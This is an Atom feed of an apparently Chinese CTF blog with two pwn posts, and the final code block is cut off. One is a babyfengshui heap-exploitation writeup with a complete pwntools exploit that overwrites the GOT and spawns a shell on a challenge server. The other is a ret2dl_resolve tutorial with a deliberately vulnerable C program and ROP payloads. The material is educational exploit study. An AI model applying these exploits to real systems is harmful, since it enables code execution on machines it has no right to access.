<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xia0ji233</title>
  
  <subtitle>xia0ji233</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-10-25T04:32:03.260Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>xia0ji233</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>babyfengshui_33c3_2016 writeup</title>
    <link href="http://example.com/2021/08/15/babyfengshui_33c3_2016%20writeup/"/>
    <id>http://example.com/2021/08/15/babyfengshui_33c3_2016%20writeup/</id>
    <published>2021-08-15T02:00:00.000Z</published>
    <updated>2021-10-25T04:32:03.260Z</updated>
    
    <content type="html"><![CDATA[<p>好久没有更新博客了，因为作者太懒了，又懒又菜，今天来康康这道题，buuoj的<a href="https://buuoj.cn/challenges#babyfengshui_33c3_2016">babyfengshui_33c3_2016</a></p><span id="more"></span><h2 id="分析elf文件"><a href="#分析elf文件" class="headerlink" title="分析elf文件"></a>分析elf文件</h2><p>checksec一下发现canary保护和NX保护，got表没有保护，且随即地址没有开启。这就意味着got表可写，拖到IDA当中发现是一个经典的堆菜单题，以我现在的水平，那就是先分析它free后指针有无清零。本来一开始看它free了两个堆块，确指将一个指针清零了，以为是有uaf漏洞，但是后面发现不是这样的，它每一条目分一个name和对应的description，name且dscription是用指针指示，并且每个条目固定是80字节的大小，因此可以把一个条目看成一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">0x7c</span>];</span><br><span class="line">    <span class="keyword">char</span> *description;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以，我把整个结构体free了之后就相当于把这个description的指针清零了，因此本题不存在uaf漏洞。再观察添加一个项目的函数，发现name是固定长度输入，且用了fgets函数限定输入0x7c字节，整个name那就是不可能溢出了，就连off by null漏洞都不存在。那么这样的话只能看看edit函数了，edit函数它在之前if也会有一个长度输入，并且用了下面这一句if判断，如果为真就直接退出系统</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="keyword">char</span> *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (<span class="keyword">char</span> *)*(&amp;ptr + a1) - <span class="number">4</span> )</span><br></pre></td></tr></table></figure><p>它这个是什么意思呢，翻译成c语言大概就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">heap *item</span></span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">(item-&gt;description+length&gt;=item<span class="number">-4</span>)</span></span>&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果它们的地址之差小于输入的长度，那就退出，如果长度溢出到那个结构体堆块的metadata，那就退出。</p><p>看似这个也不能溢出，但是实际上这个能用一个方法绕过。因为如果我们直接分配堆块的话，它们物理地址是相邻的，但是如果它们不物理相邻，中间隔了一个堆块，那就可以任意溢出中间的堆块了。并且got表可写，我们是通过指针找到description的，如果把它溢出改成got表的地址，那么在edit的时候就可以修改got表的条目了。那么我们修改哪个？把free改成system，那么在free(item-&gt;description)的时候就会变成system(item-&gt;description)，如果把item-&gt;description的内容改成”/bin/sh”，那么就可以愉快的getshell了。</p><p>这便是分析elf文件得到的信息。</p><h2 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h2><p>先构造交互函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25740</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,size,k,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;description: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;name: &#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(k).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br></pre></td></tr></table></figure><p>这里需要特别注意add函数，它有两个长度输入，一个是description的堆块大小，一个是description内容的长度大小。这个name其实没必要弄，因为利用不到，但是我还是弄了。</p><p>首先添加两个0x80大小description的堆块，这样得到了两个0x80和0x88的大堆块。free掉第一个堆块，因为都不属于fastbin范围的堆块，那么就会合并成0x108大小的堆块，那么接下来如果我再申请一个0x100大小的description就会得到这个free的堆块，那么就可以在这个堆块上溢出第二个堆块了。</p><p>下面是我的完整exp</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25740</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,size,k,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;description: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;name: &#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(k).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">elf,p=conn(<span class="number">0</span>,<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#add(b&#x27;a&#x27;,0x80,0x80,b&#x27;a&#x27;*0x10)</span></span><br><span class="line">add(<span class="string">b&#x27;/bin/sh\0&#x27;</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="number">0x100</span>,<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10c</span>*<span class="string">b&#x27;b&#x27;</span>+p64(<span class="number">0x89</span>)+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x80</span>+p32(<span class="number">0x81</span>)+p32(free_got))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_addr=u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">success(<span class="string">&#x27;free_addr&#x27;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc_addr=free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p32(sys))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;好久没有更新博客了，因为作者太懒了，又懒又菜，今天来康康这道题，buuoj的&lt;a href=&quot;https://buuoj.cn/challenges#babyfengshui_33c3_2016&quot;&gt;babyfengshui_33c3_2016&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>ret2dl_resolve</title>
    <link href="http://example.com/2021/07/19/ret2dl_resolve/"/>
    <id>http://example.com/2021/07/19/ret2dl_resolve/</id>
    <published>2021-07-19T02:00:00.000Z</published>
    <updated>2021-10-25T04:34:41.532Z</updated>
    
    <content type="html"><![CDATA[<p>有这么一个漏洞，他能在程序不提供任何输出函数的情况下执行<code>system(&quot;/bin/sh&quot;)</code>，没错，他就是<code>ret2dl_resolve</code>，这个我也认为是栈溢出的最后一关了，因此我现在就算是栈溢出毕业了吧hhhh。</p><span id="more"></span><p><code>elf</code>文件我们自给自足，自己编译，为了一步一步演示，还是给了一个输出函数，但是我们不通过这个输出函数去泄露<code>libc</code>的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to the last stackoverflow&quot;</span>;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line"><span class="built_in">puts</span>(buf);</span><br><span class="line">vuln();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$gcc -g ret2dlresolve.c -o bof -no-pie -fno-<span class="built_in">stack</span>-protector -z relro -m32</span><br></pre></td></tr></table></figure><p>我们编译32位的只开NX保护程序测试。</p><h2 id="dl-runtime-resolve函数"><a href="#dl-runtime-resolve函数" class="headerlink" title="_dl_runtime_resolve函数"></a>_dl_runtime_resolve函数</h2><p><code>_dl_runtime_resolve</code>的原型是<code>_dl_runtime_resolve(link_map,reloc_offset)</code>参数<code>link_map</code>的参数传入在<code>reloc_offset</code>之后（根据32位函数调用约定），在动态链接中，所有函数的延迟绑定都需要用这个函数去寻址。寻址的时候eip会在<code>plt[0]</code>然后<code>push got[1],jmp got[2]</code>，<code>got[1]</code>就是<code>link_map</code>，<code>got[2]</code>就是<code>dl_runtime_resolve</code>函数了。</p><p>再次解释一遍第一次调用函数的流程。调用肯定是从plt表的对应位置调用的，plt表都会指向got表一个地址，got表在没有被写入函数地址时会<code>push</code>一个<code>reloc_arg</code>,然后<code>jmp plt[0]</code>，<code>plt</code>[0]有一段指令就是压<code>got[1]</code>做参数，然后<code>jmp dl_runtime_resolve</code>。然后拆开这个函数会发现它内部调用了<code>_dl_fixup</code>函数，这个函数就是用来找地址和回写<code>got</code>表的。</p><h2 id="控制reloc-offset参数"><a href="#控制reloc-offset参数" class="headerlink" title="控制reloc_offset参数"></a>控制reloc_offset参数</h2><p>对于这个程序，我们先把栈迁移到<code>.bss</code>段上，然后在这个段上精心构造<code>payload</code>就可，首先我们直接调用<code>plt[0]</code>，自己传<code>reloc_offset</code>参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">proc=<span class="string">&#x27;./bof&#x27;</span></span><br><span class="line">elf=ELF(proc)</span><br><span class="line">p=process(proc)</span><br><span class="line">elf=ELF(proc)</span><br><span class="line"></span><br><span class="line">read=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x804c024</span><span class="comment">#readelf -S bof查看所有的段的地址</span></span><br><span class="line">ppp_ret=<span class="number">0x08049331</span><span class="comment">#ROPgadget</span></span><br><span class="line">leave_ret=<span class="number">0x08049145</span></span><br><span class="line">pop_ebp=<span class="number">0x08049333</span></span><br><span class="line">stack_size=<span class="number">0x400</span></span><br><span class="line">stack_start=bss+stack_size</span><br><span class="line">buf_size=<span class="number">0x6c</span>+<span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> buf_size*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">,p32(read)+p32(ppp_ret)<span class="comment">#弹出三个参数</span></span><br><span class="line">,p32(<span class="number">0</span>)+p32(stack_start)</span><br><span class="line">,p32(<span class="number">100</span>)</span><br><span class="line">,p32(pop_ebp)<span class="comment">#栈迁移</span></span><br><span class="line">,p32(stack_start)</span><br><span class="line">,p32(leave_ret)</span><br><span class="line">)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Welcome to the last stackoverflow&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">cmd=<span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">reloc_arg=<span class="number">0x10</span></span><br><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment">#这个给leave指令后的pop ebp，实际从下面开始执行</span></span><br><span class="line">,p32(plt_0)</span><br><span class="line">,p32(reloc_arg)</span><br><span class="line">,<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">,p32(stack_start+<span class="number">92</span>)</span><br><span class="line">)</span><br><span class="line">payload=payload.ljust(<span class="number">92</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=cmd</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/19/8Y72K69DTlsZ1PL.png" alt="ret2dl_resolve_1.png"></p><p>可以看到我在没有直接调用puts的情况下输出了<code>/bin/sh</code>字符串。</p><p>但是可以看到，这里的第二个参数是我自己传的，为什么是<code>0x10</code>呢，<code>0x10</code>是<code>puts</code>函数的重定位项在<code>.rel.plt</code>段的偏移。重定位项是这么一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">Elf32_Addr r_offset; <span class="comment">// 其实就是got表的地址</span></span><br><span class="line">Elf32_Word r_info; <span class="comment">// 符号表索引，高三个字节指示了puts函数在.dynsym段上的偏移/16。</span></span><br><span class="line">    <span class="comment">//因此得出的偏移必须被16整除。</span></span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure><p>由于我们有puts函数，所以<code>.rel.plt</code>段上有现成的结构体，我们现在主要来伪造<code>.rel.plt</code>重定位项的结构体。</p><h2 id="伪造重定位项"><a href="#伪造重定位项" class="headerlink" title="伪造重定位项"></a>伪造重定位项</h2><p>我们只需要改第二个<code>payload</code>即可。</p><p>我们在栈上伪造的重定位项的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_rel-.rel.plt_addr=reloc_offset</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rel_plt=<span class="number">0x8048388</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">fake_puts=flat(p32(puts_got),p32(<span class="number">0x307</span>))</span><br><span class="line">cmd=<span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">reloc_arg=stack_start+<span class="number">20</span>-rel_plt</span><br><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment">#这个给leave指令后的pop ebp，实际从下面开始执行</span></span><br><span class="line">,p32(plt_0)</span><br><span class="line">,p32(reloc_arg)</span><br><span class="line">,<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">,p32(stack_start+<span class="number">92</span>)</span><br><span class="line">,fake_puts</span><br><span class="line">)</span><br><span class="line">payload=payload.ljust(<span class="number">92</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=cmd</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://i.loli.net/2021/07/19/3sXOio6cLwCQ2HN.png" alt="ret2dl_resolve_2.png"></p><h2 id="伪造符号"><a href="#伪造符号" class="headerlink" title="伪造符号"></a>伪造符号</h2><p>既然<code>r_info</code>我们可以控制，自然我们也能把它的偏移改到我们可以控制的地址当中，然后在那里伪造一个符号结构体。</p><p>我们来看看符号<code>ELF32_Sym</code>的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf32_Word st_name; <span class="comment">// Symbol name(string tbl index)</span></span><br><span class="line">Elf32_Addr st_value; <span class="comment">// Symbol value</span></span><br><span class="line">Elf32_word st_size; <span class="comment">// Symbol size</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">// Symbol type and binding</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">// symbol visibility under glibc&gt;=2.2</span></span><br><span class="line">Elf32_Section st_shndx; <span class="comment">// Section index</span></span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure><p>然后构造出<code>payload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line">rel_plt=<span class="number">0x8048388</span></span><br><span class="line">dynsym=<span class="number">0x8048248</span></span><br><span class="line">str_tab=<span class="number">0x80482D8</span></span><br><span class="line">cmd=<span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">align=<span class="number">0x10</span>-(stack_start+<span class="number">28</span>-dynsym)%<span class="number">0x10</span></span><br><span class="line">fake_sym_addr=stack_start+<span class="number">28</span>+align</span><br><span class="line">r_info=(((fake_sym_addr-dynsym)//<span class="number">16</span>)&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line">fake_puts=flat(p32(puts_got),p32(r_info))</span><br><span class="line"></span><br><span class="line">reloc_arg=stack_start+<span class="number">20</span>-rel_plt</span><br><span class="line">fake_sym=flat(p32(<span class="number">0x1a</span>),p32(<span class="number">0</span>)*<span class="number">2</span>,p32(<span class="number">0x12</span>))</span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment">#这个给leave指令后的pop ebp，实际从下面开始执行</span></span><br><span class="line">,p32(plt_0)</span><br><span class="line">,p32(reloc_arg)</span><br><span class="line">,<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">,p32(stack_start+<span class="number">92</span>)</span><br><span class="line">,fake_puts</span><br><span class="line">,align*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">,fake_sym</span><br><span class="line">)</span><br><span class="line">payload=payload.ljust(<span class="number">92</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=cmd </span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><h2 id="伪造字符串"><a href="#伪造字符串" class="headerlink" title="伪造字符串"></a>伪造字符串</h2><p>最后一步就是在某个地方写上<code>puts</code>然后修改<code>st_name</code>到那个<code>puts</code>就可，然后把<code>puts</code>替换成<code>system</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 